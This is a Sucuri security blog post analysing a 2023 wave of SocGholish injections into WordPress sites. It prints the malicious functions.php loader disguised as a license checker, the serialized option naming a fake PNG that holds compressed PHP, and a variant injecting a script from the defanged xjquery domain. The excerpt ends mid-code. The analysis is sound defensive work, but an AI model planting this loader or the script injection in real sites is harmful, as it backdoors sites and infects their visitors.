---
title: Xjquery Wave of WordPress SocGholish Injections
url: https://blog.sucuri.net/2023/05/xjquery-wave-of-wordpress-socgholish-injections.html
source: 
date: 2023-05-10
fetch_date: 2025-10-04T11:39:14.556335
---

# Xjquery Wave of WordPress SocGholish Injections

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Xjquery Wave of WordPress SocGholish Injections

[![](https://secure.gravatar.com/avatar/292c42da0d9f929a9405e6ce269f101cc888f5c5cbcf8006e131c9bed042c80d?s=60&d=mm&r=g)](https://blog.sucuri.net/author/denis)

[Denis Sinegubko](https://blog.sucuri.net/author/denis)

* May 9, 2023

![New Xjquery Wave of WordPress SocGholish Injections](https://blog.sucuri.net/wp-content/uploads/2023/05/23-BlogPost_Feature-Image_1490x700_Xjquery-wave-of-WordPress-SocGholish-Injections-820x386.jpg)

In November, 2022, my colleague [Ben Martin](https://blog.sucuri.net/author/benmartin) described how hackers were using [zipped files and encrypted WordPress options stored in the database to inject SocGholish](https://blog.sucuri.net/2022/11/new-socgholish-malware-variant-uses-zip-compression-evasive-techniques.html) scripts into compromised WordPress sites. A bit later, we documented [minor changes](https://blog.sucuri.net/2022/11/new-wave-of-socgholish-cid27x-injections.html) in the way this malware worked.

By the end of March, 2023, we [started noticing](https://urlscan.io/search/#%22xjquery.com%22) a new wave of SocGholish injections that used the intermediary **xjquery[.]com** domain. It appeared to be another evolution of the same malware.

This time, however, attackers were using the same tricks in a different way. Instead of **zip,** they used the **zlib** compression — and instead of storing the SocGholish payload in **wp-options** table, they started storing the name of the fake image file containing the PHP code that injects the **xjquery[.]com** script into WordPress pages. The **xjquery[.]com** domain works both as a backend TDS for the injection as well as the frontend redirect to the final SocGholish script.

### Infected functions.php

Infected sites are found to contain the following malicious code, which is injected at the bottom the current WordPress theme’s **functions.php** file.

```
add_action( 'wp_loaded', 'wplicense_update_check' );
if ( ! function_exists( 'wplicense_update_check' ) ) {
function wplicense_update_check() {
/**
* License Update Checker Hook
*
* Register theme update checker hook.
*
*/
$wplicense_update = get_option( '_' . get_stylesheet() . '_licence_data');
if ($wplicense_updater = locate_template( $wplicense_update[0] . '-' . $wplicense_update[3] . '.' . $wplicense_update[1] )) {
load_template( $wplicense_update[4] . '.' . $wplicense_update[2] . '://' . $wplicense_updater, true);
}
}
}
```

This code adds the **wp\_loaded** action hooked to the **wplicense\_update\_check** function which obtains the location of the files with the malicious template within the **\_<theme-name>\_licence\_data** option in the **wp\_options** table. For example, if the current theme is **twentytwentythree** then the malicious option name will be **\_twentytwentythree\_licence\_data**.

Once the template file is located, this code makes WordPress load this template for every web page served by WordPress.

### Serialized \_licence\_data option

Let’s examine the malicious **\_licence\_data** option.

```
a:5:{i:0;s:10:"screenshot";i:1;s:3:"png";i:2;s:4:"zlib";i:3;s:4:"main";i:4;s:8:"compress";}
```

Here we can see serialized data. The **get\_option** function returns it unserialized, so the malicious code uses it as a five item array with a misleading name: **$wplicense\_update**.

Three of the items are used to build the name of the template file: **screenshot-main.png**, and the rest two are concatenated into the name of the “[**compress.zlib://**](https://www.php.net/manual/en/wrappers.compression.php)” protocol. These strings are used to construct the **template\_file** parameter for the **load\_template** function:

```
load_template(“compress.zlib://screenshot-main.png”, true) ;
```

Basically, this function loads PHP code from the compressed **screenshot-main.png** file, which is located in the current theme’s directory.

### PHP code in screenshot-main.png

The **screenshot-main.png** file is not an image. It’s a gzip-compressed PHP file that can be decompressed using the **gunzip** command.

We found two versions of this file. A simple one, and one based on the code of **zTDS**.

#### Simple version: screenshot-main.png

The simple variant adds the //**xjquery[.]com/js/jquery-min-js** script to the **wp\_print\_scripts** action.

```
<?php
add_action('wp_print_scripts', 'wp_updater_print_scripts');
function wp_updater_print_scripts() {
echo("<script async type='text/javascript' src='//xjquery[.]com/js/jquery-min-js'></sc...